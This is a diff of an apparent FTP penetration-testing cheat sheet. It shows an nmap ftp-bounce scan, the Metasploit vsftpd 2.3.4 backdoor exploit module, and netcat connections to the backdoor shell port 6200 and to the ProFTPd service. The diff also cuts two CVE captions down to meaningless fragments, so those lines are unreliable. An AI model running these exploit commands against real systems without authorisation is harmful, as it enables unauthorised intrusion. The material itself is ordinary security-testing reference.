@@ -3,7 +3,7 @@ id: "8c8l67attmpsisf6l"
 title: "ftp"
 description: ""
 tags: []
-order: 2
+order: "2"
 createdAt: "2026-05-30T15:43:00.573Z"
 updatedAt: "2026-05-30T15:43:16.267Z"
 ---
@@ -230,7 +230,7 @@ nmap --script ftp-bounce -p 21 $TARGET
 use exploit/unix/ftp/vsftpd_234_backdoor
 ```
 
-_vsftpd 2.3.4 Backdoor (CVE-2011-2523) Classic backdoor — triggered by :) in username._
+_234_
 
 **Tags:** ftp, vsftpd, backdoor, cve, exploitation, rce
 <!-- cmd: {"id":"s9o44m82gmpsisr53","language":"bash","sectionId":"8bvowlhltmpsisr0z","tags":["ftp","vsftpd","backdoor","cve","exploitation","rce"]} -->
@@ -283,7 +283,7 @@ nc $TARGET 6200
 nc $TARGET 21
 ```
 
-_ProFTPd mod_copy Exploit (CVE-2015-3306) Copy files via SITE CPFR/CPTO without auth._
+_ProFTPd mod_
 
 **Tags:** ftp, proftpd, mod_copy, cve, exploitation
 <!-- cmd: {"id":"kg5ajrpo1mpsisr5y","language":"bash","sectionId":"csz16qxxcmpsisr13","tags":["ftp","proftpd","mod_copy","cve","exploitation"]} -->
